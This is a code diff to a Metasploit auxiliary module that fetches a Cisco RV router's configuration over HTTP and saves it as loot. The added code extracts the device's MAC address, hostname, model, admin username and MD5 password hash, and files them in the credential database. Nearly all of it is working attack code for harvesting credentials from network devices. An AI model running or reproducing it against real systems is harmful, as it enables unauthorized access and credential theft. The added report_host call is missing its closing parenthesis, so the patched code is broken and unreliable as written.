@@ -5,7 +5,6 @@
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
-  #include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
@@ -45,6 +44,32 @@ class MetasploitModule < Msf::Auxiliary
       ])
   end
 
+  def report_cred(user,hash)
+    service_data = {
+      address: rhost,
+      port: rport,
+      service_name: ssl ? 'https' : 'http',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      module_fullname: self.fullname,
+      origin_type: :service,
+      private_data: hash,
+      private_type: :nonreplayable_hash,
+      jtr_format: 'md5',
+      username: user,
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }.merge(service_data)
+
+    cl = create_credential_login(login_data)
+  end
+
   def run_host(ip)
     begin
       uri = normalize_uri(target_uri.path)
@@ -55,20 +80,36 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if res.nil?
-      print_error("Got back an empty response.")
+      print_error("#{rhost} - Failed! Got back an empty response.")
+      print_error("Please validate the RHOST and TARGETURI options and try again.")
     elsif res.code == 200
       body = res.body
       if body.match(/####sysconfig####/)
+        # Report loot to database (and store on filesystem)
         stored_path = store_loot('cisco.rv.config', 'text/plain', rhost, res.body)
         print_good("Stored configuration (#{res.body.length} bytes) to #{stored_path}")
-        report_host(host: rhost)
-        #TODO: Dump hashes to database
-        #TODO: Add host to database
+
+        # Report host information to database
+        mac = body.match(/^LANMAC=(.*)/)[1]
+        mac = "%s:%s:%s:%s:%s:%s" % [mac[0..1], mac[2..3], mac[4..5],
+                                     mac[6..7], mac[8..9], mac[10..11]]
+        hostname = body.match(/^HOSTNAME=(.*)/)[1]
+        model = body.match(/^MODEL=(.*)/)[1]
+        report_host(host: rhost,
+                    mac: mac,
+                    name: hostname,
+                    os_name: "Cisco",
+                    os_flavor: model
+
+        # Report password hashes to database
+        user = body.match(/^user (.*)/)[1]
+        hash = body.match(/^password (.*)/)[1]
+        report_cred(user, hash)
       else
         print_error("#{rhost} - Failed!  We got back something else.")
       end
     else
-      print_error("#{rhost} - Failed! The webserver issued a #{res.code} HTTP response.")
+      print_error("#{rhost} - Failed! Got back a #{res.code} HTTP response.")
       print_error("Please validate the RHOST and TARGETURI options and try again.")
     end
 
